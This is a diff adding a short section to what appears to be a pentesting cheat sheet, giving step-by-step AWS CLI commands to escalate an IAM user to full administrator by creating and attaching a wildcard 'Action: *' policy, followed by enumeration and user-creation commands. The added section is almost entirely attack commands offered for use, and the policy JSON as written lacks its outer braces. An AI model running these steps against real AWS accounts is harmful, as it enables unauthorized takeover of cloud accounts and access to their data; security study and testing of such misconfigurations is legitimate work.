@@ -53,4 +53,29 @@
   
   IAM: Identity and access management
   
+### Escalate IAM User Privileges by Exploiting Misconfigured User Policy
+
+  1. ``` aws configure ```
+  2. ``` vim user-policy.json ```
   
+     ```
+     "Version": "2012-10-17",
+     "Statement": [
+     {
+        "Effect": "Allow",
+        "Action": "*",
+        "Resource": "*"
+     }
+     ] ```
+     
+     - This is an AdministratorAccess policy that gives administrator access to the target IAM user.
+
+  3. ``` aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json ```
+  4. ``` aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy ```
+  5. ``` aws iam list-attached-user-policies --user-name [Target Username] ```
+  6. Other commands:
+    - List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"
+    - User Policies: aws iam list-user-policies
+    - Role Policies: aws iam list-role-policies
+    - Group policies: aws iam list-group-policies
+    - Create user: aws iam create-user
